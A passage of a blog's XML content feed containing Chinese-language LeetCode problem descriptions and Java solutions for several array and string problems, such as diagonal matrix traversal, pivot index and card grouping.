<span class="number">1</span>) &#123;</span><br><span class="line">        		<span class="keyword">return</span> i;</span><br><span class="line">        	&#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<h4 id="Java-哈希表"><a href="#Java-哈希表" class="headerlink" title="Java-哈希表"></a>Java-哈希表</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">reverse</span><span class="params">(<span class="keyword">int</span> x)</span> </span>&#123;</span><br><span class="line">		<span class="keyword">int</span> res = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">while</span> (x != <span class="number">0</span>) &#123;</span><br><span class="line">			<span class="keyword">int</span> pop = x % <span class="number">10</span>;</span><br><span class="line">			<span class="keyword">if</span> (res &gt; Integer.MAX_VALUE / <span class="number">10</span> || (res == Integer.MAX_VALUE / <span class="number">10</span> &amp;&amp; pop &gt; <span class="number">7</span>)) &#123;</span><br><span class="line">				<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">if</span> (res &lt; Integer.MIN_VALUE / <span class="number">10</span> || (res == Integer.MIN_VALUE / <span class="number">10</span> &amp;&amp; pop &lt; -<span class="number">8</span>)) &#123;</span><br><span class="line">				<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">			&#125;</span><br><span class="line"></span><br><span class="line">			res = res * <span class="number">10</span> + pop;</span><br><span class="line">			x /= <span class="number">10</span>;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">return</span> res;</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>leetcode</category>
      </categories>
      <tags>
        <tag>leetcode</tag>
        <tag>算法</tag>
        <tag>String</tag>
      </tags>
  </entry>
  <entry>
    <title>557. 翻转字符串中的单词 III</title>
    <url>/2020/03/27/LeetCode/leetcode-000557.%20%E5%8F%8D%E8%BD%AC%E5%AD%97%E7%AC%A6%E4%B8%B2%E4%B8%AD%E7%9A%84%E5%8D%95%E8%AF%8D%20III/</url>
    <content><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>给定一个字符串，你需要反转字符串中每个单词的字符顺序，同时仍保留空格和单词的初始顺序。</p>
<h2 id="示例1："><a href="#示例1：" class="headerlink" title="示例1："></a>示例1：</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入: &quot;Let&#39;s take LeetCode contest&quot;</span><br><span class="line">输出: &quot;s&#39;teL ekat edoCteeL tsetnoc&quot;</span><br></pre></td></tr></table></figure>
<h2 id="注意："><a href="#注意：" class="headerlink" title="注意："></a>注意：</h2><p>在字符串中，每个单词由单个空格分隔，并且字符串中不会有任何额外的空格。</p>
<h2 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h2><h3 id="解法一："><a href="#解法一：" class="headerlink" title="解法一："></a>解法一：</h3><p>先翻转单词，再翻转整个字符串</p>
<h4 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">private</span> String <span class="title">reverseString</span><span class="params">(String s)</span> </span>&#123;</span><br><span class="line">        StringBuilder sb = <span class="keyword">new</span> StringBuilder(s.length());</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = s.length() - <span class="number">1</span>;i &gt;= <span class="number">0</span>;i--) &#123;</span><br><span class="line">        	sb.append(s.charAt(i));</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> sb.toString();</span><br><span class="line">    &#125;</span><br><span class="line">	</span><br><span class="line">	<span class="function"><span class="keyword">public</span> String <span class="title">reverseWords</span><span class="params">(String s)</span> </span>&#123;</span><br><span class="line">        StringBuilder sb = <span class="keyword">new</span> StringBuilder();</span><br><span class="line">        String[] ss = s.split(<span class="string">" "</span>);</span><br><span class="line">        <span class="keyword">for</span> (String sss : ss) &#123;</span><br><span class="line">        	sb.append(reverseString(sss)).append(<span class="string">" "</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> sb.toString().trim();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="解法二：库函数"><a href="#解法二：库函数" class="headerlink" title="解法二：库函数"></a>解法二：库函数</h3><p>先按空格分割，翻转每个字符串，拼接</p>
<h4 id="Java-1"><a href="#Java-1" class="headerlink" title="Java"></a>Java</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">reverseWords</span><span class="params">(String s)</span> </span>&#123;</span><br><span class="line">        String words[] = s.split(<span class="string">" "</span>);</span><br><span class="line">        StringBuilder res=<span class="keyword">new</span> StringBuilder();</span><br><span class="line">        <span class="keyword">for</span> (String word: words)</span><br><span class="line">            res.append(<span class="keyword">new</span> StringBuffer(word).reverse().toString() + <span class="string">" "</span>);</span><br><span class="line">        <span class="keyword">return</span> res.toString().trim();</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>leetcode</category>
      </categories>
      <tags>
        <tag>leetcode</tag>
        <tag>算法</tag>
        <tag>String</tag>
      </tags>
  </entry>
  <entry>
    <title>485. 最大连续1的个数</title>
    <url>/2020/03/27/LeetCode/leetcode-000485-%E6%9C%80%E5%A4%A7%E8%BF%9E%E7%BB%AD1%E7%9A%84%E4%B8%AA%E6%95%B0/</url>
    <content><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>给定一个二进制数组， 计算其中最大连续1的个数。</p>
<h2 id="示例1："><a href="#示例1：" class="headerlink" title="示例1："></a>示例1：</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">输入: [<span class="number">1</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>]</span><br><span class="line">输出: <span class="number">3</span></span><br><span class="line">解释: 开头的两位和最后的三位都是连续<span class="number">1</span>，所以最大连续<span class="number">1</span>的个数是 <span class="number">3</span>.</span><br></pre></td></tr></table></figure>

<h2 id="说明"><a href="#说明" class="headerlink" title="说明"></a>说明</h2><ul>
<li>输入的数组只包含 <code>0</code> 和<code>1</code>。</li>
<li>输入数组的长度是正整数，且不超过 10,000。</li>
</ul>
<h2 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h2><h3 id="解法一："><a href="#解法一：" class="headerlink" title="解法一："></a>解法一：</h3><h4 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">findMaxConsecutiveOnes</span><span class="params">(<span class="keyword">int</span>[] nums)</span> </span>&#123;</span><br><span class="line">		<span class="keyword">int</span> count = <span class="number">0</span>;</span><br><span class="line">		<span class="keyword">int</span> maxCount = <span class="number">0</span>;</span><br><span class="line">		<span class="keyword">for</span> (<span class="keyword">int</span> num : nums) &#123;</span><br><span class="line">			<span class="keyword">if</span> (<span class="number">0</span> == num) &#123;</span><br><span class="line">				count = <span class="number">0</span>;</span><br><span class="line">				maxCount = maxCount &gt; count ? maxCount : count;</span><br><span class="line">			&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">				count++;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span> maxCount = maxCount &gt; count ? maxCount : count;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>leetcode</category>
      </categories>
      <tags>
        <tag>leetcode</tag>
        <tag>算法</tag>
        <tag>Arrays</tag>
      </tags>
  </entry>
  <entry>
    <title>498. 对角线遍历</title>
    <url>/2020/03/27/LeetCode/leetcode-000498-%E5%AF%B9%E8%A7%92%E7%BA%BF%E9%81%8D%E5%8E%86/</url>
    <content><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>给定一个含有 M x N 个元素的矩阵（M 行，N 列），请以对角线遍历的顺序返回这个矩阵中的所有元素，对角线遍历如下图所示。</p>
<h2 id="示例1："><a href="#示例1：" class="headerlink" title="示例1："></a>示例1：</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入:</span><br><span class="line">[</span><br><span class="line"> [ 1, 2, 3 ],</span><br><span class="line"> [ 4, 5, 6 ],</span><br><span class="line"> [ 7, 8, 9 ]</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">输出:  [1,2,4,7,5,3,6,8,9]</span><br></pre></td></tr></table></figure>

<p><img src="https://assets.leetcode-cn.com/aliyun-lc-upload/uploads/2018/10/12/diagonal_traverse.png" alt></p>
<h2 id="说明："><a href="#说明：" class="headerlink" title="说明："></a>说明：</h2><p>给定矩阵中的元素总数不会超过 100000 。</p>
<h2 id="解法："><a href="#解法：" class="headerlink" title="解法："></a>解法：</h2><h3 id="解法一："><a href="#解法一：" class="headerlink" title="解法一："></a>解法一：</h3><p>1.前三行，最基本的判断还是要有的，避免多余循环<br>2.假设横为x，竖为y，此题求解换个思路相当于求x，y<br>3.沿对角线遍历，那必然是x–，y++（自上而下）或y–，x++（自下而上）<br>4.转弯处注意边界值判断</p>
<h4 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">int</span>[] findDiagonalOrder(<span class="keyword">int</span>[][] matrix) &#123;</span><br><span class="line">        <span class="keyword">if</span> (matrix == <span class="keyword">null</span>) <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">        <span class="keyword">if</span> (matrix.length == <span class="number">0</span>) <span class="keyword">return</span> <span class="keyword">new</span> <span class="keyword">int</span>[]&#123;&#125;;</span><br><span class="line">        <span class="keyword">if</span> (matrix.length == <span class="number">1</span>) <span class="keyword">return</span> matrix[<span class="number">0</span>];</span><br><span class="line">        <span class="keyword">int</span> size = matrix.length * matrix[<span class="number">0</span>].length;</span><br><span class="line">        <span class="keyword">int</span>[] result = <span class="keyword">new</span> <span class="keyword">int</span>[size];</span><br><span class="line">        <span class="keyword">int</span> x = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">int</span> y = <span class="number">0</span>;</span><br><span class="line">        <span class="comment">//true代表向右上角遍历，false代表向左下角遍历</span></span><br><span class="line">        <span class="keyword">boolean</span> flag = <span class="keyword">true</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; size; i++) &#123;</span><br><span class="line">            result[i] = matrix[x][y];</span><br><span class="line">            <span class="keyword">if</span> (flag) &#123;</span><br><span class="line">                x--;</span><br><span class="line">                y++;</span><br><span class="line">                <span class="comment">//边界值判断，调整顺序</span></span><br><span class="line">                <span class="keyword">if</span> (y &gt; matrix[<span class="number">0</span>].length - <span class="number">1</span>) &#123;</span><br><span class="line">                    y = matrix[<span class="number">0</span>].length - <span class="number">1</span>;</span><br><span class="line">                    x += <span class="number">2</span>;</span><br><span class="line">                    flag = <span class="keyword">false</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="comment">//边界值判断，调整顺序</span></span><br><span class="line">                <span class="keyword">if</span> (x &lt; <span class="number">0</span>) &#123;</span><br><span class="line">                    x = <span class="number">0</span>;</span><br><span class="line">                    flag = <span class="keyword">false</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                x++;</span><br><span class="line">                y--;</span><br><span class="line">                <span class="comment">//边界值判断，调整顺序</span></span><br><span class="line">                <span class="keyword">if</span> (x &gt; matrix.length - <span class="number">1</span>) &#123;</span><br><span class="line">                    x = matrix.length - <span class="number">1</span>;</span><br><span class="line">                    y += <span class="number">2</span>;</span><br><span class="line">                    flag = <span class="keyword">true</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="comment">//边界值判断，调整顺序</span></span><br><span class="line">                <span class="keyword">if</span> (y &lt; <span class="number">0</span>) &#123;</span><br><span class="line">                    y = <span class="number">0</span>;</span><br><span class="line">                    flag = <span class="keyword">true</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><p><a href="https://leetcode-cn.com/problems/diagonal-traverse/solution/javajie-ti-by-ailurusfulgens/" target="_blank" rel="noopener">LeetCode-对角线遍历-题解</a></p>
]]></content>
      <categories>
        <category>leetcode</category>
      </categories>
      <tags>
        <tag>leetcode</tag>
        <tag>算法</tag>
        <tag>Arrays</tag>
      </tags>
  </entry>
  <entry>
    <title>724. 寻找数组的中心索引</title>
    <url>/2020/03/27/LeetCode/leetcode-000724-%E5%AF%BB%E6%89%BE%E6%95%B0%E7%BB%84%E7%9A%84%E4%B8%AD%E5%BF%83%E7%B4%A2%E5%BC%95/</url>
    <content><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>给定一个整数类型的数组 nums，请编写一个能够返回数组“中心索引”的方法。</p>
<p>我们是这样定义数组中心索引的：数组中心索引的左侧所有元素相加的和等于右侧所有元素相加的和。</p>
<p>如果数组不存在中心索引，那么我们应该返回 -1。如果数组有多个中心索引，那么我们应该返回最靠近左边的那一个。</p>
<h2 id="示例1："><a href="#示例1：" class="headerlink" title="示例1："></a>示例1：</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入: </span><br><span class="line">nums &#x3D; [1, 7, 3, 6, 5, 6]</span><br><span class="line">输出: 3</span><br><span class="line">解释: </span><br><span class="line">索引3 (nums[3] &#x3D; 6) 的左侧数之和(1 + 7 + 3 &#x3D; 11)，与右侧数之和(5 + 6 &#x3D; 11)相等。</span><br><span class="line">同时, 3 也是第一个符合要求的中心索引。</span><br></pre></td></tr></table></figure>

<h2 id="示例2："><a href="#示例2：" class="headerlink" title="示例2："></a>示例2：</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">输入: </span><br><span class="line">nums = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>]</span><br><span class="line">输出: -<span class="number">1</span></span><br><span class="line">解释: </span><br><span class="line">数组中不存在满足此条件的中心索引。</span><br></pre></td></tr></table></figure>

<h2 id="说明："><a href="#说明：" class="headerlink" title="说明："></a>说明：</h2><ul>
<li><code>nums</code> 的长度范围为 <code>[0, 10000]</code>。</li>
<li>任何一个 <code>nums[i]</code> 将会是一个范围在 <code>[-1000, 1000]</code>的整数。</li>
</ul>
<h2 id="解法："><a href="#解法：" class="headerlink" title="解法："></a>解法：</h2><h3 id="解法一："><a href="#解法一：" class="headerlink" title="解法一："></a>解法一：</h3><p>先求出数组的全部和。然后从左边遍历，计算左半部分的和，如果左半部分的和lsum = sum - lsum -nums[i]，那么i就是一个中心索引</p>
<h4 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">pivotIndex</span><span class="params">(<span class="keyword">int</span>[] nums)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> sum = <span class="number">0</span>, leftsum = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> x: nums) sum += x;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; nums.length; ++i) &#123;</span><br><span class="line">            <span class="keyword">if</span> (leftsum == sum - leftsum - nums[i]) <span class="keyword">return</span> i;</span><br><span class="line">            leftsum += nums[i];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> -<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>leetcode</category>
      </categories>
      <tags>
        <tag>leetcode</tag>
        <tag>算法</tag>
        <tag>Arrays</tag>
      </tags>
  </entry>
  <entry>
    <title>747. 至少是其他数字两倍的最大数</title>
    <url>/2020/03/27/LeetCode/leetcode-000747-%E8%87%B3%E5%B0%91%E6%98%AF%E5%85%B6%E4%BB%96%E6%95%B0%E5%AD%97%E4%B8%A4%E5%80%8D%E7%9A%84%E6%9C%80%E5%A4%A7%E6%95%B0/</url>
    <content><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>在一个给定的数组nums中，总是存在一个最大元素 。</p>
<p>查找数组中的最大元素是否至少是数组中每个其他数字的两倍。</p>
<p>如果是，则返回最大元素的索引，否则返回-1。</p>
<h2 id="示例1："><a href="#示例1：" class="headerlink" title="示例1："></a>示例1：</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入: nums &#x3D; [3, 6, 1, 0]</span><br><span class="line">输出: 1</span><br><span class="line">解释: 6是最大的整数, 对于数组中的其他整数,</span><br><span class="line">6大于数组中其他元素的两倍。6的索引是1, 所以我们返回1.</span><br></pre></td></tr></table></figure>

<h2 id="示例2："><a href="#示例2：" class="headerlink" title="示例2："></a>示例2：</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">输入: nums = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>]</span><br><span class="line">输出: -<span class="number">1</span></span><br><span class="line">解释: <span class="number">4</span>没有超过<span class="number">3</span>的两倍大, 所以我们返回 -<span class="number">1</span>.</span><br></pre></td></tr></table></figure>

<h2 id="说明："><a href="#说明：" class="headerlink" title="说明："></a>说明：</h2><ul>
<li><code>nums</code> 的长度范围在<code>[1, 50]</code>.</li>
<li>每个 <code>nums[i]</code> 的整数范围在 <code>[0, 100]</code>.</li>
</ul>
<h2 id="解法："><a href="#解法：" class="headerlink" title="解法："></a>解法：</h2><h3 id="解法一：暴力"><a href="#解法一：暴力" class="headerlink" title="解法一：暴力"></a>解法一：暴力</h3><p>先找出最大的数值，挨个判断是否是剩下的两倍大。</p>
<p>需要注意的是要在比较的时候要排除自身。</p>
<h4 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">dominantIndex</span><span class="params">(<span class="keyword">int</span>[] nums)</span> </span>&#123;</span><br><span class="line">		<span class="keyword">int</span> max = Integer.MIN_VALUE;</span><br><span class="line">		<span class="keyword">int</span> bigIndex = -<span class="number">1</span>;</span><br><span class="line">		<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>;i &lt; nums.length;i++) &#123;</span><br><span class="line">			<span class="keyword">if</span> (max &lt; nums[i]) &#123;</span><br><span class="line">				max = nums[i];</span><br><span class="line">				bigIndex = i;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		</span><br><span class="line">		<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>;i &lt; nums.length;i++) &#123;</span><br><span class="line">			<span class="keyword">if</span> (i == bigIndex) &#123;</span><br><span class="line">				<span class="keyword">continue</span>;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">if</span> (nums[i] * <span class="number">2</span> &gt; max) &#123;</span><br><span class="line">				<span class="keyword">return</span> -<span class="number">1</span>;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span> bigIndex;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<h3 id="解法二：遍历一次"><a href="#解法二：遍历一次" class="headerlink" title="解法二：遍历一次"></a>解法二：遍历一次</h3><p>在遍历的时候选出最大值和第二大的值，判断最大值是否是第二大值的两倍。</p>
<h4 id="Java-1"><a href="#Java-1" class="headerlink" title="Java"></a>Java</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">dominantIndex</span><span class="params">(<span class="keyword">int</span>[] nums)</span> </span>&#123;</span><br><span class="line">		<span class="keyword">if</span> (nums.length == <span class="number">1</span>) &#123;</span><br><span class="line">			<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		</span><br><span class="line">		<span class="keyword">int</span> first = Integer.MIN_VALUE;</span><br><span class="line">		<span class="keyword">int</span> second = Integer.MIN_VALUE;</span><br><span class="line">		<span class="keyword">int</span> bigIndex = -<span class="number">1</span>;</span><br><span class="line">		<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>;i &lt; nums.length;i++) &#123;</span><br><span class="line">			<span class="keyword">int</span> n = nums[i];</span><br><span class="line">			<span class="keyword">if</span> (n &gt; first) &#123;</span><br><span class="line">				second = first;</span><br><span class="line">				first = n;</span><br><span class="line">				bigIndex = i;</span><br><span class="line">			&#125; <span class="keyword">else</span> <span class="keyword">if</span> (n &gt; second) &#123;</span><br><span class="line">                second = n;</span><br><span class="line">            &#125;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span> second * <span class="number">2</span> &gt; first ? -<span class="number">1</span> : bigIndex;</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>

<h3 id="解法三：遍历一次"><a href="#解法三：遍历一次" class="headerlink" title="解法三：遍历一次"></a>解法三：遍历一次</h3><p>在遍历的时候直接判断最大值是否满足要求</p>
<h4 id="Java-2"><a href="#Java-2" class="headerlink" title="Java"></a>Java</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">dominantIndex</span><span class="params">(<span class="keyword">int</span>[] nums)</span> </span>&#123;</span><br><span class="line">		<span class="keyword">int</span> max = <span class="number">0</span>;</span><br><span class="line">		<span class="keyword">boolean</span> pin = <span class="keyword">true</span>;</span><br><span class="line">		<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt; nums.length; i++) &#123;</span><br><span class="line">			<span class="keyword">if</span> (nums[max] &lt; nums[i]) &#123;</span><br><span class="line">				<span class="keyword">if</span> (nums[i] &gt;= nums[max] * <span class="number">2</span>) &#123;</span><br><span class="line">					pin = <span class="keyword">true</span>;</span><br><span class="line">				&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">					pin = <span class="keyword">false</span>;</span><br><span class="line">				&#125;</span><br><span class="line">				max = i;</span><br><span class="line">			&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">				<span class="keyword">if</span> (nums[max] &lt; nums[i] * <span class="number">2</span>) &#123;</span><br><span class="line">					pin = <span class="keyword">false</span>;</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">if</span> (pin) &#123;</span><br><span class="line">			<span class="keyword">return</span> max;</span><br><span class="line">		&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">			<span class="keyword">return</span> -<span class="number">1</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>leetcode</category>
      </categories>
      <tags>
        <tag>leetcode</tag>
        <tag>算法</tag>
        <tag>Arrays</tag>
      </tags>
  </entry>
  <entry>
    <title>914. 卡牌分组</title>
    <url>/2020/03/27/LeetCode/leetcode-000914-%E5%8D%A1%E7%89%8C%E5%88%86%E7%BB%84/</url>
    <content><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>给定一副牌，每张牌上都写着一个整数。</p>
<p>此时，你需要选定一个数字 X，使我们可以将整副牌按下述规则分成 1 组或更多组：</p>
<pre><code>每组都有 X 张牌。
组内所有的牌上都写着相同的整数。</code></pre><p>仅当你可选的 X &gt;= 2 时返回 true。</p>
<h2 id="示例1"><a href="#示例1" class="headerlink" title="示例1:"></a>示例1:</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：[1,2,3,4,4,3,2,1]</span><br><span class="line">输出：true</span><br><span class="line">解释：可行的分组是 [1,1]，[2,2]，[3,3]，[4,4]</span><br></pre></td></tr></table></figure>

<h2 id="示例2"><a href="#示例2" class="headerlink" title="示例2:"></a>示例2:</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：[1,1,1,2,2,2,3,3]</span><br><span class="line">输出：false</span><br><span class="line">解释：没有满足要求的分组。</span><br></pre></td></tr></table></figure>

<h2 id="示例3"><a href="#示例3" class="headerlink" title="示例3:"></a>示例3:</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">输入：[<span class="number">1</span>]</span><br><span class="line">输出：<span class="keyword">false</span></span><br><span class="line">解释：没有满足要求的分组。</span><br></pre></td></tr></table></figure>

<h2 id="示例4"><a href="#示例4" class="headerlink" title="示例4"></a>示例4</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">输入：[<span class="number">1</span>,<span class="number">1</span>]</span><br><span class="line">输出：<span class="keyword">true</span></span><br><span class="line">解释：可行的分组是 [<span class="number">1</span>,<span class="number">1</span>]</span><br></pre></td></tr></table></figure>

<h2 id="示例5："><a href="#示例5：" class="headerlink" title="示例5："></a>示例5：</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">输入：[<span class="number">1</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">2</span>,<span class="number">2</span>,<span class="number">2</span>]</span><br><span class="line">输出：<span class="keyword">true</span></span><br><span class="line">解释：可行的分组是 [<span class="number">1</span>,<span class="number">1</span>]，[<span class="number">2</span>,<span class="number">2</span>]，[<span class="number">2</span>,<span class="number">2</span>]</span><br></pre></td></tr></table></figure>

<h2 id="Constraints"><a href="#Constraints" class="headerlink" title="Constraints:"></a>Constraints:</h2><ul>
<li><code>1 &lt;= deck.length &lt;= 10000</code></li>
<li><code>0 &lt;= deck[i] &lt; 10000</code></li>
</ul>
<h2 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h2><h3 id="解法一："><a href="#解法一：" class="headerlink" title="解法一："></a>解法一：</h3><p>按照题目要求，X首先必须是N的约束。同时，如果deck数组里面的每个数字都要分成X或者NX这些组，X也必须是每个数字总数的约数。因此，只要求出数组长度N和数组数字里面的所有总数的最大公约数即可。</p>
<h4 id="JAVA"><a href="#JAVA" class="headerlink" title="JAVA"></a>JAVA</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">hasGroupsSizeX</span><span class="params">(<span class="keyword">int</span>[] deck)</span> </span>&#123;</span><br><span class="line">		<span class="keyword">if</span> (deck.length &lt; <span class="number">2</span>) &#123;</span><br><span class="line">			<span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		Map&lt;Integer, Integer&gt; valueAndCount = <span class="keyword">new</span> HashMap&lt;Integer, Integer&gt;();</span><br><span class="line">		<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; deck.length; i++) &#123;</span><br><span class="line">			<span class="keyword">if</span> (valueAndCount.containsKey(deck[i])) &#123;</span><br><span class="line">				valueAndCount.put(deck[i], valueAndCount.get(deck[i]) + <span class="number">1</span>);</span><br><span class="line">			&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">				valueAndCount.put(deck[i], <span class="number">1</span>);</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">int</span> x = -<span class="number">1</span>;</span><br><span class="line">		<span class="keyword">for</span> (<span class="keyword">int</span> cnt : valueAndCount.values()) &#123;</span><br><span class="line">			x = x == -<span class="number">1</span> ? cnt : gcd(x, cnt);</span><br><span class="line">			<span class="keyword">if</span> (x == <span class="number">1</span>) &#123;</span><br><span class="line">				<span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span> x &gt;= <span class="number">2</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="function"><span class="keyword">private</span> <span class="keyword">int</span> <span class="title">gcd</span><span class="params">(<span class="keyword">int</span> a, <span class="keyword">int</span> b)</span> </span>&#123;</span><br><span class="line">		<span class="keyword">return</span> b == <span class="number">0</span> ? a : gcd(b, a % b);</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>





]]></content>
      <categories>
        <category>leetcode</category>
      </categories>
      <tags>
        <tag>leetcode</tag>
        <tag>算法</tag>
        <tag>Arrays</tag>
      </tags>
  </entry>
  <entry>
    <title>26. 删除排序数组中的重复项</title>
    <url>/2020/03/26/LeetCode/leetcode-000026.%20%E5%88%A0%E9%99%A4%E6%8E%92%E5%BA%8F%E6%95%B0%E7%BB%84%E4%B8%AD%E7%9A%84%E9%87%8D%E5%A4%8D%E9%A1%B9/</url>
    <content><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>给定一个排序数组，你需要在 原地 删除重复出现的元素，使得每个元素只出现一次，返回移除后数组的新长度。</p>
<p>不要使用额外的数组空间，你必须在 原地 修改输入数组 并在使用 O(1) 额外空间的条件下完成。</p>
